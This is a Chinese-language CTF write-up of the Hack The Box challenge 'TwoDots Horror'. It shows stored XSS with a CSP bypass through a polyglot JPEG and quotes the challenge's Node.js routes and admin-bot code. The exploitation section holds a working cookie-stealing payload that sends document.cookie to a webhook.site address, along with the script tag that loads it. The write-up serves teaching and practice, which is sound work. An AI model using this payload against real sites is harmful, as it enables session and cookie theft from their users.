---
title: TwoDots Horror
categories:
  - CTF
tags:
  - XSS，
  - CSP绕过
---
## 0x00 前言
[TwoDots Horror](https://app.hackthebox.com/challenges/twodots-horror)是一道有关XSS，和CSP绕过的题。黑盒的话也能做，只是要全靠猜。白盒的话，做的更快。这道题非常有趣，在[Bookworm](https://app.hackthebox.com/machines/Bookworm)这台机器上的User部分也用到了大概这种思路。

---
## 0x01 黑盒思路
![1.png](/assets/img/2023-12-1-TwoDots-Horror/1.png)
映入眼帘的是一个登录与注册页面，注册一个账号进去后发现有两个功能。
1. 输入一段话，必须有两个`.`，而且需要管理员审核，就说明管理员会看到我们输入的东西。
2. 可以上传一个头像。
![2.png](/assets/img/2023-12-1-TwoDots-Horror/2.png)
![3.png](/assets/img/2023-12-1-TwoDots-Horror/3.png)
思路：输入js代码盗取管理员cookie，但是输入js代码有限制，只能通过加载图片，来执行任意js代码。

---
## 0x02 白盒思路
```js
router.post('/api/submit', AuthMiddleware, async (req, res) => {

    return db.getUser(req.data.username)

        .then(user => {

            if (user === undefined) return res.redirect('/');

            const { content } = req.body;

            if(content){

                twoDots = content.match(/\./g);

                if(twoDots == null || twoDots.length != 2){

                    return res.status(403).send(response('Your story must contain two sentences! We call it TwoDots Horror!'));

                }

                return db.addPost(user.username, content)

                    .then(() => {

                        bot.purgeData(db);

                        res.send(response('Your submission is awaiting approval by Admin!'));

                    });

            }

            return res.status(403).send(response('Please write your story first!'));

        })

        .catch(() => res.status(500).send(response('Something went wrong!')));

});
```
这段代码有限制了输入的内容必须有且只有两个`.`，提交之后会储存到数据库，而且没有转义任何东西，之后跟进到`bot.js`。
```js
const cookies = [{

    'name': 'flag',

    'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'

}];

async function purgeData(db){

    const browser = await puppeteer.launch(browser_options);

    const page = await browser.newPage();

  

    await page.goto('http://127.0.0.1:1337/');

    await page.setCookie(...cookies);

  

    await page.goto('http://127.0.0.1:1337/review', {

        waitUntil: 'networkidle2'

    });

  

    await browser.close();

    await db.migrate();

};
```
flag藏在cookie中，这段代码的意思是机器人会访问网站，然后设置cookie为flag，然后跟进到/review路由。
```js
router.get('/review', async (req, res, next) => {

    if(req.ip != '127.0.0.1') return res.redirect('/');

  

    return db.getPosts(0)

        .then(feed => {    

            res.render('review.html', { feed });

        })

        .catch(() => res.status(500).send(response('Something went wrong!')));

});
```
限制了只有本地能访问，然后从数据库中提取数据，放到review.html模板中。这个过程也是没有做任何转义。
所以思路和黑盒一样。只是白盒做起来更加清晰。

---
## 0x03 利用
### 1. 选择接收cookie的方式
1. 使用https://webhook.site/
2. 使用vps开启一个http服务器，例如python开启的http服务器。
---
### 2. 生成包含js代码的图片。
在UploadHelper.js这个文件里的代码中做了对图片的限制
```js
module.exports = {

    async uploadImage(file) {

        return new Promise(async (resolve, reject) => {

            if(file == undefined) return reject(new Error("Please select a file to upload!"));

            try{

                if (!isJpg(file.data)) return reject(new Error("Please upload a valid JPEG image!"));

                const dimensions = sizeOf(file.data);

                if(!(dimensions.width >= 120 && dimensions.height >= 120)) {

                    return reject(new Error("Image size must be at least 120x120!"));

                }

                uploadPath = path.join(__dirname, '/../uploads', file.md5);

                file.mv(uploadPath, (err) => {

                    if (err) return reject(err);

                });

                return resolve(file.md5);

            }catch (e){

                console.log(e);

                reject(e);

            }

        });

    }

}
```
使用`isJpg()`函数对图片做了检测，还限制了图片的大小必须在120x120以内。
可以使用脚本生成一个带有js代码的图片。
地址：https://github.com/s-3ntinel/imgjs_polygloter
也可以参考文件的方法自己生成一个带有js代码的图片。
地址：https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

我的话就采取捷径，使用脚本了，但是文章一定要看，知其然知其所以然。
```bash
python .\img_polygloter.py jpg --height 120 --width 120 --payload 'window.location.href="https://webhook.site/6d242a56-5fc5-4f99-bafe-5512a88bd38d/?c="+document.cookie;' --output xss.jpg
```
然后上传图片并访问，得知地址。
```
http://159.65.20.166:30850/api/avatar/mao
```
其实不带参数也能访问。

---
### 输入包含该脚本的js代码

```js
<script charset="ISO-8859-1" src="/api/avatar/mao"></script>..
```
1. `ISO-8859-1` 是一个字符集（Character Set）的名称，也被称为 Latin-1。它是国际标准化组织（ISO）定义的字符编码，其中包含了西欧语言的大多数字符。
---
### 接收flag
![4.png](/assets/img/2023-12-1-TwoDots-Horror/4.png)

---
## 参考
https://salucci.ch/2023/05/20/xss-with-a-jpg-jpeg-to-bypass-csp/
